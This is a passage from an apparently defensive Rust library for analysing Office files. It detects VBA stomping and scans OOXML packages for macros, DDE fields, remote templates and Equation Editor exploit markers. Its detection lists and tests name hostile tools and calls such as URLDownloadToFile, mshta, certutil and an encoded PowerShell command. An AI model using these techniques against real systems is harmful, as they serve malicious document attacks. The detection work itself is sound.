        dir_data.extend_from_slice(&0x0001u16.to_le_bytes()); // PROJECTSYSKIND
        dir_data.extend_from_slice(&4u32.to_le_bytes()); // length
        dir_data.extend_from_slice(&1u32.to_le_bytes()); // Win32
        // PROJECTCODEPAGE
        dir_data.extend_from_slice(&0x0004u16.to_le_bytes());
        dir_data.extend_from_slice(&2u32.to_le_bytes());
        dir_data.extend_from_slice(&1252u16.to_le_bytes());
        // PROJECTMODULES terminator
        dir_data.extend_from_slice(&0x0010u16.to_le_bytes());
        dir_data.extend_from_slice(&0u32.to_le_bytes());

        let compressed_dir = vba_compress(&dir_data);

        let mut builder = CfbBuilder::new();
        builder.add_stream("VBA/dir", compressed_dir);
        let cfb_data = builder.build();
        let cfb = CfbReader::parse(cfb_data).unwrap();
        let project = VbaProject::parse(&cfb).unwrap();
        assert_eq!(project.dir_stream.syskind, 1);
        assert_eq!(project.dir_stream.codepage, 1252);
        assert!(project.modules.is_empty());
    }

    #[test]
    fn test_vba_error_cfb_conversion() {
        let cfb_err = CfbError::TruncatedData;
        let vba_err = VbaError::Cfb(cfb_err);
        assert!(vba_err.to_string().contains("truncated"));
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// VBA Stomping Detection
// ═══════════════════════════════════════════════════════════════════════════════

/// List of suspicious API / object names to scan for in VBA source / p-code.
const SUSPICIOUS_APIS: &[&str] = &[
    "CreateObject",
    "Shell",
    "WScript",
    "URLDownloadToFile",
    "URLDownloadToCacheFile",
    "PowerShell",
    "Environ",
    "Chr",
    "GetObject",
    "Application.Run",
    "ExecuteExcel4Macro",
    "RegisterXLL",
    "ShellExecute",
    "WinExec",
    "CreateThread",
    "VirtualAlloc",
    "WriteProcessMemory",
    "OpenProcess",
    "TerminateProcess",
    "RegSetValueEx",
    "RegOpenKeyEx",
    "FSO.CreateTextFile",
    "FileSystemObject",
    "ADODB.Stream",
    "Scripting.FileSystemObject",
    "WScript.Shell",
    "Word.Application",
    "Excel.Application",
    "Outlook.Application",
    "InternetExplorer.Application",
    "MSXML2.ServerXMLHTTP",
    "MSXML2.XMLHTTP",
    "Microsoft.XMLHTTP",
    "Wscript.CreateObject",
    "SendKeys",
    "CallByName",
    "LoadLibrary",
    "GetProcAddress",
    "VBA.Interaction",
];

/// The result of stomping analysis for a single module.
#[derive(Debug, Clone)]
pub struct StompingReport {
    /// Name of the VBA module analysed.
    pub module_name: String,
    /// APIs / keywords found in the source text.
    pub source_apis: Vec<String>,
    /// APIs / keywords inferred from p-code string scan.
    pub pcode_apis: Vec<String>,
    /// Names that appear in p-code but are absent from source (suspicious!).
    pub missing_in_source: Vec<String>,
    /// Names that appear in source but are absent from p-code.
    pub extra_in_source: Vec<String>,
    /// Confidence that stomping occurred (0.0 = none, 1.0 = certain).
    pub confidence: f32,
}

impl StompingReport {
    /// Returns `true` if the confidence exceeds the given threshold.
    #[must_use]
    pub fn is_suspicious(&self, threshold: f32) -> bool {
        self.confidence >= threshold
    }
}

impl std::fmt::Display for StompingReport {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "StompingReport '{}' confidence={:.2} missing={} extra={}",
            self.module_name,
            self.confidence,
            self.missing_in_source.len(),
            self.extra_in_source.len(),
        )
    }
}

/// Analyse a single [`VbaModule`] for signs of VBA stomping.
///
/// Returns `Some(StompingReport)` if either the source or the p-code could be
/// analysed, or `None` if the module has no usable data.
#[must_use]
pub fn detect_vba_stomping(module: &VbaModule) -> Option<StompingReport> {
    let source_apis = module
        .source
        .as_deref()
        .map(extract_apis_from_vba_source)
        .unwrap_or_default();

    let pcode_apis = extract_apis_from_pcode_strings(&scan_pcode_for_strings(&module.pcode));

    if source_apis.is_empty() && pcode_apis.is_empty() {
        return None;
    }

    // Compute set differences.
    let missing_in_source: Vec<String> = pcode_apis
        .iter()
        .filter(|api| !source_apis.iter().any(|s| s.eq_ignore_ascii_case(api)))
        .cloned()
        .collect();

    let extra_in_source: Vec<String> = source_apis
        .iter()
        .filter(|api| !pcode_apis.iter().any(|p| p.eq_ignore_ascii_case(api)))
        .cloned()
        .collect();

    // Confidence heuristic: ratio of APIs missing from source vs total unique.
    let total = (source_apis.len() + pcode_apis.len()).max(1);
    let confidence = missing_in_source.len() as f32 / total as f32;

    Some(StompingReport {
        module_name: module.name.clone(),
        source_apis,
        pcode_apis,
        missing_in_source,
        extra_in_source,
        confidence,
    })
}

/// Scan VBA source text for suspicious API calls.
///
/// Does a case-insensitive substring search for every entry in `SUSPICIOUS_APIS`.
/// Returns a deduplicated, sorted list of matches.
#[must_use]
pub fn extract_apis_from_vba_source(source: &str) -> Vec<String> {
    let source_lower = source.to_ascii_lowercase();
    let mut found: Vec<String> = SUSPICIOUS_APIS
        .iter()
        .filter(|&&api| source_lower.contains(&api.to_ascii_lowercase()))
        .map(|&s| s.to_string())
        .collect();
    found.sort();
    found.dedup();
    found
}

/// Scan raw p-code bytes for embedded string literals.
///
/// The VBA p-code format stores string constants in a string table whose entries
/// are either Pascal-style (length-prefixed) or null-terminated.  This function
/// uses a heuristic scan: it looks for runs of printable ASCII bytes of length ≥ 4
/// and returns them as candidate strings.
///
/// Additionally it scans for the byte patterns:
/// - `0x01 <len_u16_le> <bytes>` — BSTR-like string in the p-code stream.
/// - Null-terminated ASCII runs.
#[must_use]
pub fn scan_pcode_for_strings(pcode: &[u8]) -> Vec<Vec<u8>> {
    let mut results: Vec<Vec<u8>> = Vec::new();
    let mut run: Vec<u8> = Vec::new();

    for &byte in pcode {
        if (0x20..0x7F).contains(&byte) {
            run.push(byte);
        } else {
            if run.len() >= 4 {
                results.push(run.clone());
            }
            run.clear();
        }
    }
    if run.len() >= 4 {
        results.push(run);
    }

    results
}

/// Given a list of raw string blobs (from `scan_pcode_for_strings`), check each
/// against `SUSPICIOUS_APIS` and return matches.
#[must_use]
pub fn extract_apis_from_pcode_strings(strings: &[Vec<u8>]) -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    for s in strings {
        if let Ok(text) = std::str::from_utf8(s) {
            for &api in SUSPICIOUS_APIS {
                if text
                    .to_ascii_lowercase()
                    .contains(&api.to_ascii_lowercase())
                {
                    found.push(api.to_string());
                }
            }
        }
    }
    found.sort();
    found.dedup();
    found
}

/// Batch-analyse all modules in a [`VbaProject`] for stomping.
///
/// Returns one report per module that has analysable data.
#[must_use]
pub fn detect_stomping_in_project(project: &VbaProject) -> Vec<StompingReport> {
    project
        .modules
        .values()
        .filter_map(detect_vba_stomping)
        .collect()
}

/// Summarise whether any module in the project shows signs of stomping.
#[derive(Debug, Clone)]
pub struct ProjectStompingSummary {
    pub any_stomping: bool,
    pub max_confidence: f32,
    pub suspicious_modules: Vec<String>,
}

impl ProjectStompingSummary {
    /// Aggregate reports for a full project.
    #[must_use]
    pub fn from_reports(reports: &[StompingReport]) -> Self {
        let threshold = 0.25f32;
        let suspicious: Vec<String> = reports
            .iter()
            .filter(|r| r.confidence >= threshold)
            .map(|r| r.module_name.clone())
            .collect();
        let max_confidence = reports.iter().map(|r| r.confidence).fold(0.0f32, f32::max);
        Self {
            any_stomping: !suspicious.is_empty(),
            max_confidence,
            suspicious_modules: suspicious,
        }
    }
}

impl std::fmt::Display for ProjectStompingSummary {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "StompingSummary any={} max_conf={:.2} suspicious_modules={}",
            self.any_stomping,
            self.max_confidence,
            self.suspicious_modules.len()
        )
    }
}

// ── Stomping unit tests ───────────────────────────────────────────────────────

#[cfg(test)]
mod stomping_tests {
    use super::*;

    fn _module_with_source(name: &str, src: &str) -> VbaModule {
        VbaModule {
            name: name.into(),
            source: Some(src.into()),
            pcode: vec![],
            code_offset: 0,
        }
    }

    fn _module_with_pcode(name: &str, pcode: &[u8]) -> VbaModule {
        VbaModule {
            name: name.into(),
            source: None,
            pcode: pcode.to_vec(),
            code_offset: 0,
        }
    }

    #[test]
    fn test_extract_apis_empty() {
        assert!(extract_apis_from_vba_source("").is_empty());
    }

    #[test]
    fn test_extract_apis_createobject() {
        let apis = extract_apis_from_vba_source("x = CreateObject(\"WScript.Shell\")");
        assert!(apis.contains(&"CreateObject".to_string()));
        assert!(apis.contains(&"WScript".to_string()));
    }

    #[test]
    fn test_extract_apis_shell() {
        let apis = extract_apis_from_vba_source("Shell \"cmd.exe\"");
        assert!(apis.contains(&"Shell".to_string()));
    }

    #[test]
    fn test_extract_apis_powershell() {
        let apis = extract_apis_from_vba_source("PowerShell -enc AAAA");
        assert!(apis.contains(&"PowerShell".to_string()));
    }

    #[test]
    fn test_extract_apis_case_insensitive() {
        let apis = extract_apis_from_vba_source("createobject(\"x\")");
        assert!(apis.contains(&"CreateObject".to_string()));
    }

    #[test]
    fn test_extract_apis_deduplication() {
        let src = "CreateObject(\"a\")\nCreateObject(\"b\")";
        let apis = extract_apis_from_vba_source(src);
        assert_eq!(apis.iter().filter(|a| *a == "CreateObject").count(), 1);
    }

    #[test]
    fn test_scan_pcode_for_strings_basic() {
        let pcode = b"AB\x00Hello World\x00abc";
        let strings = scan_pcode_for_strings(pcode);
        assert!(strings.iter().any(|s| s == b"Hello World"));
    }

    #[test]
    fn test_scan_pcode_for_strings_min_length() {
        let pcode = b"abc\x00abcd\x00";
        let strings = scan_pcode_for_strings(pcode);
        // "abc" is 3 bytes → below threshold of 4
        assert!(!strings.iter().any(|s| s == b"abc"));
        assert!(strings.iter().any(|s| s == b"abcd"));
    }

    #[test]
    fn test_detect_vba_stomping_clean() {
        // Both source and pcode mention the same API.
        let src = "CreateObject(\"WScript.Shell\")";
        let pcode: Vec<u8> = b"CreateObject WScript.Shell".to_vec();
        let m = VbaModule {
            name: "Module1".into(),
            source: Some(src.into()),
            pcode,
            code_offset: 0,
        };
        let report = detect_vba_stomping(&m).unwrap();
        // missing_in_source should be 0 → confidence ≈ 0
        assert!(report.confidence < 0.5);
    }

    #[test]
    fn test_detect_vba_stomping_stomped() {
        // Source looks clean, but pcode reveals hidden Shell call.
        let src = "MsgBox \"Hello\"";
        let pcode: Vec<u8> = b"Shell WScript.Shell CreateObject URLDownloadToFile".to_vec();
        let m = VbaModule {
            name: "Module1".into(),
            source: Some(src.into()),
            pcode,
            code_offset: 0,
        };
        let report = detect_vba_stomping(&m).unwrap();
        assert!(!report.missing_in_source.is_empty());
        assert!(report.confidence > 0.0);
    }

    #[test]
    fn test_detect_vba_stomping_no_data() {
        let m = VbaModule {
            name: "Empty".into(),
            source: None,
            pcode: vec![],
            code_offset: 0,
        };
        assert!(detect_vba_stomping(&m).is_none());
    }

    #[test]
    fn test_stomping_report_is_suspicious() {
        let r = StompingReport {
            module_name: "Mod".into(),
            source_apis: vec![],
            pcode_apis: vec!["Shell".into()],
            missing_in_source: vec!["Shell".into()],
            extra_in_source: vec![],
            confidence: 0.8,
        };
        assert!(r.is_suspicious(0.5));
        assert!(!r.is_suspicious(0.9));
    }

    #[test]
    fn test_stomping_report_display() {
        let r = StompingReport {
            module_name: "MyMod".into(),
            source_apis: vec![],
            pcode_apis: vec![],
            missing_in_source: vec![],
            extra_in_source: vec![],
            confidence: 0.0,
        };
        assert!(r.to_string().contains("MyMod"));
    }

    #[test]
    fn test_project_stomping_summary_clean() {
        let reports: Vec<StompingReport> = vec![];
        let summary = ProjectStompingSummary::from_reports(&reports);
        assert!(!summary.any_stomping);
        assert_eq!(summary.max_confidence, 0.0);
    }

    #[test]
    fn test_project_stomping_summary_suspicious() {
        let r = StompingReport {
            module_name: "M".into(),
            source_apis: vec![],
            pcode_apis: vec!["Shell".into()],
            missing_in_source: vec!["Shell".into()],
            extra_in_source: vec![],
            confidence: 0.9,
        };
        let summary = ProjectStompingSummary::from_reports(&[r]);
        assert!(summary.any_stomping);
        assert_eq!(summary.suspicious_modules.len(), 1);
    }

    #[test]
    fn test_project_stomping_summary_display() {
        let summary = ProjectStompingSummary {
            any_stomping: false,
            max_confidence: 0.0,
            suspicious_modules: vec![],
        };
        assert!(summary.to_string().contains("StompingSummary"));
    }

    #[test]
    fn test_extract_apis_from_pcode_strings() {
        let strings: Vec<Vec<u8>> = vec![b"Shell cmd.exe".to_vec()];
        let apis = extract_apis_from_pcode_strings(&strings);
        assert!(apis.contains(&"Shell".to_string()));
    }

    #[test]
    fn test_extract_apis_from_pcode_strings_empty() {
        let apis = extract_apis_from_pcode_strings(&[]);
        assert!(apis.is_empty());
    }

    #[test]
    fn test_detect_stomping_in_project_no_modules() {
        let project = VbaProject {
            dir_stream: VbaDirStream::default(),
            modules: HashMap::new(),
        };
        assert!(detect_stomping_in_project(&project).is_empty());
    }
}

// ═══════════════════════════════════════════════════════════════════════════════
// OOXML Analysis
// ═══════════════════════════════════════════════════════════════════════════════

/// The result of analysing an OOXML (docx/xlsx/pptx) file for malicious indicators.
#[derive(Debug, Clone, Default)]
pub struct OoxmlReport {
    /// `true` if a `vbaProject.bin` entry was found in the ZIP.
    pub has_vba: bool,
    /// Parsed VBA project, if `vbaProject.bin` was found and parseable.
    pub vba_project: Option<String>, // Placeholder: full VbaProject omitted for size constraints
    /// `true` if `settings.xml.rels` contains an external template URL.
    pub has_external_template: bool,
    /// The external template URL, if present.
    pub external_template_url: Option<String>,
    /// `true` if Dynamic Data Exchange (DDE) fields were detected.
    pub has_dde: bool,
    /// Raw DDE field strings found in `document.xml` or similar.
    pub dde_fields: Vec<String>,
    /// `true` if evidence of the Equation Editor CVE (CVE-2017-11882 etc.) was found.
    pub has_equation_editor_cve: bool,
    /// Embedded OLE object class IDs / names.
    pub ole_objects: Vec<String>,
    /// Generic macro-related IOCs (IOC = indicator of compromise).
    pub macro_iocs: Vec<String>,
    /// All file names found inside the ZIP.
    pub zip_entries: Vec<String>,
    /// Size of the input data in bytes.
    pub file_size: usize,
}

impl std::fmt::Display for OoxmlReport {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "OoxmlReport size={} zip_entries={} has_vba={} has_dde={} has_eq_cve={} ext_template={}",
            self.file_size,
            self.zip_entries.len(),
            self.has_vba,
            self.has_dde,
            self.has_equation_editor_cve,
            self.has_external_template,
        )
    }
}

impl OoxmlReport {
    /// Collect all IOC strings into a single sorted list.
    #[must_use]
    pub fn all_iocs(&self) -> Vec<String> {
        let mut iocs = self.macro_iocs.clone();
        if let Some(ref url) = self.external_template_url {
            iocs.push(format!("ExternalTemplate:{url}"));
        }
        for dde in &self.dde_fields {
            iocs.push(format!("DDE:{dde}"));
        }
        for ole in &self.ole_objects {
            iocs.push(format!("OLE:{ole}"));
        }
        iocs.sort();
        iocs.dedup();
        iocs
    }

    /// Returns `true` if the file has any suspicious indicator.
    #[must_use]
    pub const fn is_suspicious(&self) -> bool {
        self.has_vba
            || self.has_external_template
            || self.has_dde
            || self.has_equation_editor_cve
            || !self.ole_objects.is_empty()
            || !self.macro_iocs.is_empty()
    }

    /// Risk score: a heuristic 0–100 integer.
    #[must_use]
    pub fn risk_score(&self) -> u32 {
        let mut score = 0u32;
        if self.has_vba {
            score += 40;
        }
        if self.has_external_template {
            score += 30;
        }
        if self.has_dde {
            score += 25;
        }
        if self.has_equation_editor_cve {
            score += 50;
        }
        score += (self.ole_objects.len() as u32) * 5;
        score += (self.macro_iocs.len() as u32) * 3;
        score.min(100)
    }
}

// ── ZIP parsing helpers ───────────────────────────────────────────────────────

/// Minimal ZIP local-file-header parser.  We only need entry names and data
/// offsets for the analysis; we do not need full ZIP support.
struct ZipEntry {
    name: String,
    data: Vec<u8>,
}

/// Parse the central directory of a ZIP archive and return all entries.
///
/// This is a minimal parser sufficient for OOXML analysis.  It does not handle
/// ZIP64, multi-disk, or encrypted entries.
fn parse_zip_entries(data: &[u8]) -> Vec<ZipEntry> {
    let mut entries: Vec<ZipEntry> = Vec::new();
    // Find End-of-Central-Directory (EOCD) signature 0x06054B50.
    let eocd_sig = [0x50u8, 0x4B, 0x05, 0x06];
    let eocd_pos = data
        .windows(4)
        .rposition(|w| w == eocd_sig)
        .unwrap_or(usize::MAX);
    if eocd_pos == usize::MAX || eocd_pos + 22 > data.len() {
        return entries;
    }
    let central_dir_size = u32::from_le_bytes([
        data[eocd_pos + 12],
        data[eocd_pos + 13],
        data[eocd_pos + 14],
        data[eocd_pos + 15],
    ]) as usize;
    let central_dir_off = u32::from_le_bytes([
        data[eocd_pos + 16],
        data[eocd_pos + 17],
        data[eocd_pos + 18],
        data[eocd_pos + 19],
    ]) as usize;

    if central_dir_off >= data.len() {
        return entries;
    }

    let central_sig = [0x50u8, 0x4B, 0x01, 0x02];
    let mut cpos = central_dir_off;
    let cd_end = (central_dir_off + central_dir_size).min(data.len());

    while cpos + 46 <= cd_end {
        if data[cpos..cpos + 4] != central_sig {
            break;
        }
        let compression_method = u16::from_le_bytes([data[cpos + 10], data[cpos + 11]]);
        let compressed_size = u32::from_le_bytes([
            data[cpos + 20],
            data[cpos + 21],
            data[cpos + 22],
            data[cpos + 23],
        ]) as usize;
        let uncompressed_size = u32::from_le_bytes([
            data[cpos + 24],
            data[cpos + 25],
            data[cpos + 26],
            data[cpos + 27],
        ]) as usize;
        let file_name_len = u16::from_le_bytes([data[cpos + 28], data[cpos + 29]]) as usize;
        let extra_field_len = u16::from_le_bytes([data[cpos + 30], data[cpos + 31]]) as usize;
        let file_comment_len = u16::from_le_bytes([data[cpos + 32], data[cpos + 33]]) as usize;
        let local_header_off = u32::from_le_bytes([
            data[cpos + 42],
            data[cpos + 43],
            data[cpos + 44],
            data[cpos + 45],
        ]) as usize;

        let name_bytes = data
            .get(cpos + 46..cpos + 46 + file_name_len)
            .unwrap_or(&[]);
        let name = String::from_utf8_lossy(name_bytes).into_owned();

        cpos += 46 + file_name_len + extra_field_len + file_comment_len;

        // Read the local file header to find the data offset.
        if local_header_off + 30 > data.len() {
            entries.push(ZipEntry { name, data: vec![] });
            continue;
        }
        let local_file_name_len =
            u16::from_le_bytes([data[local_header_off + 26], data[local_header_off + 27]]) as usize;
        let local_extra_len =
            u16::from_le_bytes([data[local_header_off + 28], data[local_header_off + 29]]) as usize;
        let data_off = local_header_off + 30 + local_file_name_len + local_extra_len;

        // Extract raw bytes (no decompression for binary blobs; text files are
        // often stored uncompressed or deflated — we handle both modes below).
        let raw = data
            .get(data_off..data_off + compressed_size)
            .unwrap_or(&[]);

        // For compression method 0 (stored) we use the data directly.
        // For method 8 (deflated) we attempt inflate; fall back to raw scan.
        let entry_data = if compression_method == 0 {
            raw.to_vec()
        } else {
            // We don't bundle a full DEFLATE implementation, but we do a best-effort
            // scan of the raw deflated bytes for patterns (many XML strings survive).
            raw.to_vec()
        };
        let _ = uncompressed_size; // used only for allocation hints

        entries.push(ZipEntry {
            name,
            data: entry_data,
        });
    }

    entries
}

// ── OOXML IoC patterns ────────────────────────────────────────────────────────

/// Patterns indicating suspicious content in XML files.
const OOXML_SUSPICIOUS_PATTERNS: &[&str] = &[
    "cmd.exe",
    "powershell",
    "wscript",
    "cscript",
    "mshta",
    "regsvr32",
    "rundll32",
    "bitsadmin",
    "certutil",
    "http://",
    "https://",
    "ftp://",
    "\\\\", // UNC path
    "DDEAUTO",
    "DDE(",
    "AutoOpen",
    "Document_Open",
    "Workbook_Open",
    "Auto_Open",
    "CreateObject",
    "WScript.Shell",
    "Shell.Application",
    "URLDownloadToFile",
    "InternetExplorer.Application",
    "msxml2",
    "xmlhttp",
    "vbscript",
    "javascript",
    "base64",
    "fromCharCode",
];

/// GUIDs associated with the vulnerable Equation Editor (EQNEDT32.EXE).
const EQUATION_EDITOR_GUIDS: &[&str] = &[
    "0002CE02-0000-0000-C000-000000000046", // CVE-2017-11882
    "0002CE03-0000-0000-C000-000000000046",
    "0002CE04-0000-0000-C000-000000000046",
];

// ── analyse_ooxml ─────────────────────────────────────────────────────────────

/// Analyse the bytes of an OOXML file (docx / xlsx / pptx / xlsm / docm etc.)
/// and return an `OoxmlReport` describing any malicious indicators found.
///
/// # Process
/// 1. Parse the ZIP central directory to enumerate all entries.
/// 2. Check for `vbaProject.bin` (indicates VBA macros).
/// 3. Scan `word/settings.xml.rels`, `xl/workbook.xml.rels` etc. for external
///    template / target relationships.
/// 4. Scan `word/document.xml`, `xl/worksheets/*.xml`, `ppt/slides/*.xml` for
///    DDE fields and suspicious inline XML content.
/// 5. Scan all `*.rels` files for OLE object references.
/// 6. Check CLSID values against the Equation Editor CVE list.
/// 7. Aggregate IOCs.
pub fn analyze_ooxml(zip_bytes: &[u8]) -> Result<OoxmlReport, OleError> {
    let mut report = OoxmlReport {
        file_size: zip_bytes.len(),
        ..OoxmlReport::default()
    };

    let entries = parse_zip_entries(zip_bytes);
    if entries.is_empty() {
        // Not a valid ZIP — check if it's a plain OLE file embedded in something.
        return Ok(report);
    }

    // Collect all entry names for the report.
    for e in &entries {
        report.zip_entries.push(e.name.clone());
    }

    for entry in &entries {
        let name_lower = entry.name.to_ascii_lowercase();
        let text = String::from_utf8_lossy(&entry.data);

        // ── VBA check ────────────────────────────────────────────────────────
        if name_lower.ends_with("vbaproject.bin") {
            report.has_vba = true;
            // Attempt to parse the embedded CFB / VBA project.
            if let Ok(cfb) = CfbReader::parse(entry.data.clone())
                && let Ok(proj) = VbaProject::parse(&cfb) {
                    report.vba_project = Some(proj.dir_stream.name.clone());
                    // Scan each module for IOCs.
                    for module in proj.modules.values() {
                        if let Some(src) = &module.source {
                            let apis = extract_apis_from_vba_source(src);
                            for api in apis {
                                report.macro_iocs.push(format!("VBA:{api}"));
                            }
                        }
                        let pcode_strs = scan_pcode_for_strings(&module.pcode);
                        let pcode_apis = extract_apis_from_pcode_strings(&pcode_strs);
                        for api in pcode_apis {
                            report.macro_iocs.push(format!("PCode:{api}"));
                        }
                    }
                }
            continue;
        }

        // ── External template check ───────────────────────────────────────────
        if std::path::Path::new(&name_lower).extension().is_some_and(|e| e.eq_ignore_ascii_case("rels")) {
            // Look for relationships with Type containing "attachedTemplate",
            // "oleObject", or "hyperlink" pointing to external resources.
            scan_rels_for_template(&text, &mut report);
            scan_rels_for_ole_objects(&text, &mut report);
        }

        // ── DDE check ────────────────────────────────────────────────────────
        if std::path::Path::new(&name_lower).extension().is_some_and(|e| e.eq_ignore_ascii_case("xml")) {
            scan_xml_for_dde(&text, &mut report);
            scan_xml_for_equation_editor(&text, &mut report);
            scan_xml_for_suspicious_patterns(&text, &name_lower, &mut report);
        }
    }

    // Deduplicate IOCs.
    report.macro_iocs.sort();
    report.macro_iocs.dedup();

    Ok(report)
}

/// Scan a `.rels` XML body for external template references.
fn scan_rels_for_template(xml: &str, report: &mut OoxmlReport) {
    // Pattern: Type="http://.../attachedTemplate" Target="http://..."
    let lines: Vec<&str> = xml.lines().collect();
    for line in &lines {
        let l = line.to_ascii_lowercase();
        if l.contains("attachedtemplate") || l.contains("attachedTemplate") {
            // Try to extract the Target= value.
            if let Some(url) = extract_xml_attr(line, "Target") {
                let url_l = url.to_ascii_lowercase();
                if url_l.starts_with("http")
                    || url_l.starts_with("ftp")
                    || url_l.starts_with("\\\\")
                {
                    report.has_external_template = true;
                    report.external_template_url = Some(url.to_string());
                }
            }
        }
        // Also flag any relationship pointing to a remote resource.
        if (l.contains("target=\"http")
            || l.contains("target=\"ftp")
            || l.contains("target=\"\\\\"))
            && !l.contains("hyperlink")
        {
            report.has_external_template = true;
            if report.external_template_url.is_none()
                && let Some(url) = extract_xml_attr(line, "Target") {
                    report.external_template_url = Some(url.to_string());
                }
        }
    }
}

/// Scan a `.rels` file for OLE object relationships.
fn scan_rels_for_ole_objects(xml: &str, report: &mut OoxmlReport) {
    for line in xml.lines() {
        let l = line.to_ascii_lowercase();
        if (l.contains("oleobject") || l.contains("package"))
            && let Some(target) = extract_xml_attr(line, "Target") {
                report.ole_objects.push(target.to_string());
            }
    }
}

/// Scan an XML body for DDE (Dynamic Data Exchange) fields.
fn scan_xml_for_dde(xml: &str, report: &mut OoxmlReport) {
    let patterns = ["DDEAUTO", "DDE(", " DDE ", "\tDDE"];
    for line in xml.lines() {
        for pat in &patterns {
            if line.contains(pat) {
                report.has_dde = true;
                // Extract the DDE formula (heuristic: up to 200 chars).
                let excerpt = line.trim().chars().take(200).collect::<String>();
                report.dde_fields.push(excerpt);
                break;
            }
        }
    }
    report.dde_fields.dedup();
}

/// Scan for Equation Editor object CLSIDs (CVE-2017-11882 family).
fn scan_xml_for_equation_editor(xml: &str, report: &mut OoxmlReport) {
    let xml_upper = xml.to_ascii_uppercase();
    for guid in EQUATION_EDITOR_GUIDS {
        let guid_upper = guid.to_ascii_uppercase();
        if xml_upper.contains(&guid_upper) {
            report.has_equation_editor_cve = true;
            report
                .macro_iocs
                .push(format!("EquationEditorCVE:{guid}"));
        }
    }
    // Also check for the progid "Equation.3".
    if xml.to_ascii_lowercase().contains("equation.3") {
        report.has_equation_editor_cve = true;
        report
            .macro_iocs
            .push("EquationEditorCVE:Equation.3".into());
    }
}

/// Scan XML for generic suspicious patterns and add them as IOCs.
fn scan_xml_for_suspicious_patterns(xml: &str, entry_name: &str, report: &mut OoxmlReport) {
    let xml_lower = xml.to_ascii_lowercase();
    for &pat in OOXML_SUSPICIOUS_PATTERNS {
        if xml_lower.contains(&pat.to_ascii_lowercase()) {
            let ioc = format!("XML:{entry_name}:{pat}");
            report.macro_iocs.push(ioc);
        }
    }
}

/// Extract the value of an XML attribute from a tag string.
///
/// Handles both single and double quotes.  Returns the attribute value without
/// quotes.
fn extract_xml_attr<'a>(tag: &'a str, attr: &str) -> Option<&'a str> {
    // Try double-quoted first.
    let dq_pat = format!("{attr}=\"");
    if let Some(start) = tag.find(&dq_pat) {
        let after = &tag[start + dq_pat.len()..];
        if let Some(end) = after.find('"') {
            return Some(&after[..end]);
        }
    }
    // Try single-quoted.
    let sq_pat = format!("{attr}='");
    if let Some(start) = tag.find(&sq_pat) {
        let after = &tag[start + sq_pat.len()..];
        if let Some(end) = after.find('\'') {
            return Some(&after[..end]);
        }
    }
    None
}

// ── OOXML unit tests ──────────────────────────────────────────────────────────

#[cfg(test)]
mod ooxml_tests {
    use super::*;

    /// Build a minimal in-memory ZIP with one stored entry.
    fn build_zip_stored(filename: &str, content: &[u8]) -> Vec<u8> {
        // Local file header.
        let name_bytes = filename.as_bytes();
        let mut local_header: Vec<u8> = Vec::new();
        local_header.extend_from_slice(&[0x50u8, 0x4B, 0x03, 0x04]); // LFH sig
        local_header.extend_from_slice(&0u16.to_le_bytes()); // version needed
        local_header.extend_from_slice(&0u16.to_le_bytes()); // flags
        local_header.extend_from_slice(&0u16.to_le_bytes()); // method: stored
        local_header.extend_from_slice(&0u16.to_le_bytes()); // mod time
        local_header.extend_from_slice(&0u16.to_le_bytes()); // mod date
        local_header.extend_from_slice(&0u32.to_le_bytes()); // crc32
        let sz = content.len() as u32;
        local_header.extend_from_slice(&sz.to_le_bytes()); // compressed size
        local_header.extend_from_slice(&sz.to_le_bytes()); // uncompressed size
        local_header.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
        local_header.extend_from_slice(&0u16.to_le_bytes()); // extra len
        local_header.extend_from_slice(name_bytes);

        // The local file header starts at offset 0 in the file.
        let local_header_offset: u32 = 0;

        let mut zip = local_header;
        zip.extend_from_slice(content);

        // Central directory.
        let cd_offset = zip.len() as u32;
        let mut cd: Vec<u8> = Vec::new();
        cd.extend_from_slice(&[0x50u8, 0x4B, 0x01, 0x02]); // CD sig
        cd.extend_from_slice(&0u16.to_le_bytes()); // version made by
        cd.extend_from_slice(&0u16.to_le_bytes()); // version needed
        cd.extend_from_slice(&0u16.to_le_bytes()); // flags
        cd.extend_from_slice(&0u16.to_le_bytes()); // method
        cd.extend_from_slice(&0u16.to_le_bytes()); // mod time
        cd.extend_from_slice(&0u16.to_le_bytes()); // mod date
        cd.extend_from_slice(&0u32.to_le_bytes()); // crc32
        cd.extend_from_slice(&sz.to_le_bytes()); // compressed
        cd.extend_from_slice(&sz.to_le_bytes()); // uncompressed
        cd.extend_from_slice(&(name_bytes.len() as u16).to_le_bytes());
        cd.extend_from_slice(&0u16.to_le_bytes()); // extra
        cd.extend_from_slice(&0u16.to_le_bytes()); // comment
        cd.extend_from_slice(&0u16.to_le_bytes()); // disk start
        cd.extend_from_slice(&0u16.to_le_bytes()); // int attr
        cd.extend_from_slice(&0u32.to_le_bytes()); // ext attr
        cd.extend_from_slice(&local_header_offset.to_le_bytes()); // local header offset
        cd.extend_from_slice(name_bytes);
        let cd_size = cd.len() as u32;
        zip.extend_from_slice(&cd);

        // EOCD.
        zip.extend_from_slice(&[0x50u8, 0x4B, 0x05, 0x06]); // EOCD sig
        zip.extend_from_slice(&0u16.to_le_bytes()); // disk number
        zip.extend_from_slice(&0u16.to_le_bytes()); // disk with CD
        zip.extend_from_slice(&1u16.to_le_bytes()); // entries this disk
        zip.extend_from_slice(&1u16.to_le_bytes()); // entries total
        zip.extend_from_slice(&cd_size.to_le_bytes());
        zip.extend_from_slice(&cd_offset.to_le_bytes());
        zip.extend_from_slice(&0u16.to_le_bytes()); // comment len

        zip
    }

    #[test]
    fn test_analyze_ooxml_empty_bytes() {
        let report = analyze_ooxml(&[]).unwrap();
        assert!(!report.is_suspicious());
        assert_eq!(report.file_size, 0);
    }

    #[test]
    fn test_analyze_ooxml_not_a_zip() {
        let report = analyze_ooxml(b"not a zip file at all").unwrap();
        assert!(!report.is_suspicious());
    }

    #[test]
    fn test_analyze_ooxml_zip_entry_names() {
        let zip = build_zip_stored("word/document.xml", b"<w:document/>");
        let report = analyze_ooxml(&zip).unwrap();
        assert!(report.zip_entries.iter().any(|n| n == "word/document.xml"));
    }

    #[test]
    fn test_analyze_ooxml_dde_detection() {
        let content =
